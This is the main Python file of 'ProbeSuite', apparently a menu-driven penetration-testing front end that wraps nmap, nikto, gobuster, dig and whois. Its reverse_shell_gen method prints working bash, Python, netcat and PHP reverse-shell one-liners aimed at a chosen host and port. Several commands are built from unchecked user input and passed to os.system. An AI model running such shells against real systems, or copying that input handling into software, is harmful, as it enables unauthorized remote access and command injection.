#!/usr/bin/env python3
# app/main.py - ProbeSuite Main Entry Point

import sys
import os
import time
import shutil


# Add paths for proper imports
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)
sys.path.insert(0, os.path.join(BASE_DIR, 'app'))

from app.information_gathering.active.active_menu import run_active_menu
from app.information_gathering.passive.passive_menu import run_passive_menu
from app.information_gathering.osint.osint_menu import run_osint_menu

from config import C_OK, C_WARN, C_ERR, C_RESET, C_INFO, C_TITLE, VERSION
from utils import Logger, pause, InputValidator, clear_screen, CommandRunner


# =============================
# LOGO
# =============================
LOGO_1 = r"""
 ____  ____   ___  ____   _____ _____       ___ __ __   
|  _ \|  _ \ / _ \| __ ) | ____/ ___|| | | |_ _|_   _|                                                  
| |_) | |_) | | | |  _ \ |  _| \___ \| | | || |  | |                                                  
|  __/|  _ <| |_| | |_) ||____  __) || |_| || |  | |                                                              
|_|   |_| \_\\___/|____/ |____/|____/ \___/|___| |_|                                                          
         
                              /
               \             / /
                \\\' ,      / //
                 \\\//,   _/ //,
                  \_-//' /  //<,
                    \ ///  >  \\\`__/_
                    /,)-^>> _\` \\\
                    (/   \\ //\\
                        // _//\\\\
                      ((` ((                                            
"""

LOGO_2 = r"""
 ____  ____   ___  ____   _____ _____       ___ __ __       
|  _ \|  _ \ / _ \| __ ) | ____/ ___|| | | |_ _|_   _|     
| |_) | |_) | | | |  _ \ |  _| \___ \| | | || |  | |       
|  __/|  _ <| |_| | |_) ||____  __) || |_| || |  | |       
|_|   |_| \_\\___/|____/ |____/|____/ \___/|___| |_| 
                                                            /T /I
                                                           / |/ | .-~/
                                                       T\ Y  I  |/  /  _
                                      /T               | \I  |  I  Y.-~/
                                     I l   /I       T\ |  |  l  |  T  /
                                  T\ |  \ Y l  /T   | \I  l   \ `  l Y
                              __  | \l   \l  \I l __l  l   \   `  _. |
                              \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
                               \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
                             .--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
                              >--.  ~-.   ._  ~>-"    "\\   7   7   ]
                             ^.___~"--._    ~-{  .-~ .  `\ Y . /    |
                              <__ ~"-.  ~       /_/   \   \I  Y   : |
                                ^-.__           ~(_/   \   >._:   | l______
                                    ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
                                           (_/ .  ~(   /'     "~"--,Y   -=b-. _)
                                            (_/ .  \  :           / l      c"~o \
                                             \ /    `.    .     .^   \_.-~"~--.  )
                                              (_/ .   `  /     /       !       )/
                                               / / _.   '.   .':      /        '
                                               ~(_/ .   /    _  `  .-<_
                                                 /_/ . ' .-~" `.  / \  \          ,z=.
                                                 ~( /   '  :   | K   "-.~-.______//
                                                   "-,.    l   I/ \_    __{--->._(==.
                                                    //(     \  <    ~"~"     //
                                                   /' /\     \  \     ,v=.  ((
                                                 .^. / /\     "  }__ //===-  `
                                                / / ' '  "-.,__ {---(==-
                                              .^ '       :  T  ~"   ll       
                                             / .  .  . : | :!        \\
                                            (_/  /   | | j-"          ~^
"""

LOGOS = [LOGO_1, LOGO_2]
STATE_FILE = "logo.txt"

def pick_logo():
    """Alternate logos using state file"""
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE, "r") as f:
                v = f.read().strip()
        else:
            v = "1"
    except Exception:
        v = "1"

    if v == "1":
        chosen, new = LOGO_1, "2"
    else:
        chosen, new = LOGO_2, "1"

    try:
        with open(STATE_FILE, "w") as f:
            f.write(new)
    except Exception:
        pass

    return chosen

LOGO = pick_logo()

# =============================
# Terminal Utility
# =============================
class Terminal:
    MARGIN = 4
    
    @staticmethod
    def get_width():
        return shutil.get_terminal_size((80, 20)).columns
    
    @staticmethod
    def print_margin(text=""):
        margin = ' ' * Terminal.MARGIN
        if text:
            print(margin + text)
        else:
            print()
    
    @staticmethod
    def print_separator():
        width = Terminal.get_width() - Terminal.MARGIN - 2
        sep = ' ' * max(1, width)
        Terminal.print_margin(sep)


class MainMenu:
    def __init__(self):
        self.menu_items = {
            '1': ('Information Gathering', self.information_gathering_menu),
            '2': ('Scanning & Enumeration', self.scanning_menu),
            '3': ('Vulnerability Assessment', self.vulnerability_menu),
            '4': ('Exploitation', self.exploitation_menu),
            '5': ('Post Exploitation', self.post_exploitation_menu),
            '6': ('Reporting', self.reporting_menu),
        }
    
    def show_logo(self):
        clear_screen()
        Terminal.print_separator()
        # Logo chiqarish
        for line in LOGO.strip().split('\n'):
            Terminal.print_margin(f"{C_TITLE}{line}{C_RESET}")
        Terminal.print_margin(f" \n v{VERSION}  •  Recon • Scanning • Exploitation • Vulnerability • Reporting")
        Terminal.print_separator()
        print()
    
    def display_main_menu(self):
        self.show_logo()
        
        Terminal.print_margin(f"{C_TITLE}┌─ MAIN MENU ─────────────────────┐{C_RESET}")
        Terminal.print_margin()
        
        for key, (name, _) in self.menu_items.items():
            Terminal.print_margin(f"{C_INFO}  [{key}]  {name}{C_RESET}")
        
        Terminal.print_margin()
        Terminal.print_margin(f"{C_WARN}  [0]  Exit{C_RESET}")
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
        Terminal.print_margin()
    
    # ==================== INFORMATION GATHERING ====================
    def information_gathering_menu(self):
            """Information Gathering Submenu"""
            while True:
                self.show_logo()
                
                Terminal.print_margin(f"{C_TITLE}┌─ INFORMATION GATHERING ─────────────┐{C_RESET}")
                Terminal.print_margin()
                
                items = [
                    ("1", "Passive Information Gathering"),
                    ("2", "Active Information Gathering"),
                    ("3", "OSINT"),
                ]
                
                for num, name in items:
                    Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
                
                Terminal.print_margin()
                Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
                Terminal.print_margin()
                Terminal.print_margin(f"{C_TITLE}└────────────────────────────────────┘{C_RESET}")
                Terminal.print_margin()
                
                choice = InputValidator.get_choice()
                
                if choice == '0':
                    return
                elif choice == '1':
                    run_passive_menu()
                elif choice == '2':
                    run_active_menu()
                elif choice == '3':
                    run_osint_menu()
                else:
                    Logger.error("Invalid choice!")
                    time.sleep(0.5)
    
    # ==================== SCANNING & ENUMERATION ====================
    def scanning_menu(self):
        while True:
            self.show_logo()
            
            Terminal.print_margin(f"{C_TITLE}┌─ SCANNING & ENUMERATION ────────┐{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}ACTIVE SCANNING:{C_RESET}")
            Terminal.print_margin()
            
            items = [
                ("1", "Nmap Advanced Scanner"),
                ("2", "WPScan (WordPress)"),
                ("3", "Nikto Web Scanner"),
                ("4", "Masscan (High-Speed)"),
            ]
            
            for num, name in items:
                Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
            
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}PASSIVE SCANNING:{C_RESET}")
            Terminal.print_margin()
            
            items2 = [
                ("6", "Certificate Search (crt.sh)"),
                ("7", "Shodan Scan"),
                ("8", "DNS Enumeration"),
                ("9", "WHOIS Lookup"),
            ]
            
            for num, name in items2:
                Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
            
            Terminal.print_margin()
            Terminal.print_margin(f"{C_INFO}GUI TOOLS:{C_RESET}")
            Terminal.print_margin()
            
            items3 = [
                ("10", "Zenmap (Nmap GUI)"),
                ("11", "Angry IP Scanner"),
            ]
            
            for num, name in items3:
                Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
            
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            elif choice == '1':
                self.run_nmap_scanner()
            elif choice == '2':
                self.run_wpscan()
            elif choice == '3':
                self.run_nikto()
            elif choice == '4':
                self.run_masscan_scanner()
            elif choice == '5':
                self.run_gobuster()
            elif choice == '6':
                self.run_certificate_search()
            elif choice == '7':
                self.run_shodan()
            elif choice == '8':
                self.dns_enumeration()
            elif choice == '9':
                self.whois_lookup()
            elif choice == '10':
                self.launch_zenmap()
            elif choice == '11':
                self.launch_angry_ip()
            else:
                Logger.error("Invalid choice!")
                time.sleep(0.5)
    
    # ==================== SCANNER RUNNERS ====================
    def run_nmap_scanner(self):
        """Run Nmap Advanced Scanner"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'scanning', 'active'))
            from nmap_advenced import NmapScanner  # app. ni olib tashlang
            scanner = NmapScanner()
            scanner.run()
        except ImportError as e:
            Logger.error(f"Nmap scanner module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure nmap_advenced.py exists in app/scanning/active/")
            pause()
        except Exception as e:
            Logger.error(f"Error running Nmap scanner: {e}")
            pause()
    
    def run_wpscan(self):
        """Run WPScan"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'scanning', 'active'))
            from wpscan import WPScanner  # app. ni olib tashlang
            scanner = WPScanner()
            scanner.run()
        except ImportError as e:
            Logger.error(f"WPScan module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure wpscan.py exists in app/scanning/active/")
            pause()
        except Exception as e:
            Logger.error(f"Error running WPScan: {e}")
            pause()
    
    def run_masscan_scanner(self):
        """Run Masscan Scanner"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'scanning', 'active'))
            from masscan import MasscanScanner
            scanner = MasscanScanner()
            scanner.run()
        except ImportError as e:
            Logger.error(f"Masscan scanner module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure masscan.py exists in app/scanning/active/")
            pause()
        except Exception as e:
            Logger.error(f"Error running Masscan: {e}")
            pause()
    
    def run_certificate_search(self):
        """Run Certificate Search"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'scanning', 'passive'))
            from certificate_search import CertificateSearch  # app. ni olib tashlang
            scanner = CertificateSearch()
            scanner.run()
        except ImportError as e:
            Logger.error(f"Certificate search module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure certificate_search.py exists in app/scanning/passive/")
            pause()
        except Exception as e:
            Logger.error(f"Error running Certificate Search: {e}")
            pause()
    
    def run_shodan(self):
        """Run Shodan Scanner"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'scanning', 'passive'))
            from shodan_scan import ShodanScanner
            scanner = ShodanScanner()
            scanner.run()
        except ImportError as e:
            Logger.error(f"Shodan scanner module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure shodan_scan.py exists in app/scanning/passive/")
            pause()
        except Exception as e:
            Logger.error(f"Error running Shodan: {e}")
            pause()
    
    def run_nikto(self):
        """Run Nikto"""
        if not CommandRunner.check_tool('nikto'):
            Logger.error("Nikto not installed!")
            Logger.info("Install: sudo apt install nikto")
            pause()
            return
        
        target = InputValidator.get_url()
        if not target:
            return
        
        Logger.info(f"Launching Nikto...")
        Logger.info(f"Target: {target}")
        cmd = f"nikto -h {target}"
        pause("Press Enter to start...")
        os.system(cmd)
        pause()
    
    def run_gobuster(self):
        """Run Gobuster"""
        if not CommandRunner.check_tool('gobuster'):
            Logger.error("Gobuster not installed!")
            Logger.info("Install: sudo apt install gobuster")
            pause()
            return
        
        target = InputValidator.get_url()
        if not target:
            return
        
        wordlist = "/usr/share/wordlists/dirb/common.txt"
        Logger.info(f"Launching Gobuster...")
        Logger.info(f"Target: {target}")
        Logger.info(f"Wordlist: {wordlist}")
        
        if not os.path.exists(wordlist):
            Logger.warning(f"Wordlist not found: {wordlist}")
            wordlist = input(f"{C_INFO}Enter wordlist path: {C_RESET}").strip()
            if not wordlist or not os.path.exists(wordlist):
                Logger.error("Invalid wordlist!")
                pause()
                return
        
        cmd = f"gobuster dir -u {target} -w {wordlist}"
        pause("Press Enter to start...")
        os.system(cmd)
        pause()
    
    def dns_enumeration(self):
        """DNS Enumeration"""
        self.show_logo()
        Terminal.print_margin(f"{C_TITLE}┌─ DNS ENUMERATION ───────────────┐{C_RESET}")
        Terminal.print_margin()
        
        domain = InputValidator.get_domain()
        if not domain:
            pause()
            return
        
        Logger.info(f"DNS Enumeration for: {domain}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for record_type in record_types:
            Logger.info(f"Querying {record_type} records...")
            cmd = f"dig {domain} {record_type} +short"
            os.system(cmd)
            print()
        
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
        pause()
    
    def whois_lookup(self):
        """WHOIS Lookup"""
        self.show_logo()
        Terminal.print_margin(f"{C_TITLE}┌─ WHOIS LOOKUP ──────────────────┐{C_RESET}")
        Terminal.print_margin()
        
        domain = InputValidator.get_domain()
        if not domain:
            pause()
            return
        
        if not CommandRunner.check_tool('whois'):
            Logger.error("WHOIS not installed!")
            Logger.info("Install: sudo apt install whois")
            pause()
            return
        
        Logger.info(f"WHOIS lookup for: {domain}")
        cmd = f"whois {domain}"
        os.system(cmd)
        
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
        pause()
    
    def launch_zenmap(self):
        """Launch Zenmap"""
        if not CommandRunner.check_tool('zenmap'):
            Logger.error("Zenmap not installed!")
            Logger.info("Install: sudo apt install zenmap")
            pause()
            return
        
        Logger.info("Launching Zenmap...")
        os.system('zenmap &')
        pause("Zenmap launched in background")
    
    def launch_angry_ip(self):
        """Launch Angry IP Scanner"""
        if not CommandRunner.check_tool('ipscan'):
            Logger.error("Angry IP Scanner not installed!")
            Logger.info("Download from: https://angryip.org")
            pause()
            return
        
        Logger.info("Launching Angry IP Scanner...")
        os.system('ipscan &')
        pause("Angry IP Scanner launched in background")
    
    # main.py ichidagi vulnerability_menu funksiyasini BU KOD BILAN almashtiring:

    # ==================== VULNERABILITY ASSESSMENT ====================
    def vulnerability_menu(self):
        """Vulnerability Assessment menu"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'vulnerability'))
            from vulnerability_menu import run_vulnerability_menu
            run_vulnerability_menu()
        except ImportError as e:
            Logger.error(f"Vulnerability menu module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure vulnerability_menu.py exists in app/vulnerability/")
            pause()
        except Exception as e:
            Logger.error(f"Error running vulnerability menu: {e}")
            pause()
    
    # ==================== EXPLOITATION ====================
    def exploitation_menu(self):
        """Exploitation menu"""
        try:
            sys.path.insert(0, os.path.join(BASE_DIR, 'app', 'exploitation'))
            from exploitation_menu import run_exploitation_menu
            run_exploitation_menu()
        except ImportError as e:
            Logger.error(f"Exploitation menu module not found!")
            Logger.warning(f"Error: {e}")
            Logger.info("Please ensure exploitation_menu.py exists in app/exploitation/")
            pause()
        except Exception as e:
            Logger.error(f"Error running exploitation menu: {e}")
            pause()
    
    def reverse_shell_gen(self):
        """Reverse Shell Generator"""
        self.show_logo()
        Terminal.print_margin(f"{C_TITLE}┌─ REVERSE SHELL GENERATOR ──────┐{C_RESET}")
        Terminal.print_margin()
        
        lhost = input(f"{C_INFO}  Enter LHOST (your IP): {C_RESET}").strip()
        lport = input(f"{C_INFO}  Enter LPORT (your port): {C_RESET}").strip()
        
        if lhost and lport:
            Terminal.print_margin()
            Terminal.print_margin(f"{C_OK}  Reverse Shell Examples:{C_RESET}")
            Terminal.print_margin(f"  Bash:")
            Terminal.print_margin(f"    bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
            Terminal.print_margin()
            Terminal.print_margin(f"  Python:")
            Terminal.print_margin(f"    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
            Terminal.print_margin()
            Terminal.print_margin(f"  Netcat:")
            Terminal.print_margin(f"    nc -e /bin/sh {lhost} {lport}")
            Terminal.print_margin()
            Terminal.print_margin(f"  PHP:")
            Terminal.print_margin(f"    php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        
        Terminal.print_margin()
        Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
        pause()
    
    # ==================== POST EXPLOITATION ====================
    def post_exploitation_menu(self):
        while True:
            self.show_logo()
            
            Terminal.print_margin(f"{C_TITLE}┌─ POST EXPLOITATION ─────────────┐{C_RESET}")
            Terminal.print_margin()
            
            items = [
                ("1", "Privilege Escalation"),
                ("2", "Data Extraction"),
                ("3", "Persistence"),
                ("4", "Lateral Movement"),
                ("5", "Credential Harvesting"),
            ]
            
            for num, name in items:
                Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
            
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            else:
                Logger.warning("Post-exploitation module under development")
                pause()
    
    # ==================== REPORTING ====================
    def reporting_menu(self):
        while True:
            self.show_logo()
            
            Terminal.print_margin(f"{C_TITLE}┌─ REPORTING ─────────────────────┐{C_RESET}")
            Terminal.print_margin()
            
            items = [
                ("1", "Generate HTML Report"),
                ("2", "Generate PDF Report"),
                ("3", "Executive Summary"),
                ("4", "Export to CSV"),
                ("5", "Export to JSON"),
            ]
            
            for num, name in items:
                Terminal.print_margin(f"{C_INFO}  [{num}]  {name}{C_RESET}")
            
            Terminal.print_margin()
            Terminal.print_margin(f"{C_WARN}  [0]  Back{C_RESET}")
            Terminal.print_margin()
            Terminal.print_margin(f"{C_TITLE}└────────────────────────────────┘{C_RESET}")
            Terminal.print_margin()
            
            choice = InputValidator.get_choice()
            
            if choice == '0':
                return
            else:
                Logger.warning("Reporting module under development")
                pause()
    
    # ==================== MAIN RUN ====================
    def run(self):
        while True:
            self.display_main_menu()
            choice = InputValidator.get_choice()
            
            if choice == '0':
                Logger.info("Exiting ProbeSuite...")
                time.sleep(0.5)
                sys.exit(0)
            
            if choice in self.menu_items:
                _, menu_func = self.menu_items[choice]
                menu_func()
            else:
                Logger.error("Invalid choice!")
                time.sleep(0.5)


def main():
    """Main entry point"""
    try:
        menu = MainMenu()
        menu.run()
    except KeyboardInterrupt:
        print(f"\n{C_ERR}[!] Interrupted by user{C_RESET}")
        sys.exit(0)
    except Exception as e:
        Logger.error(f"Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()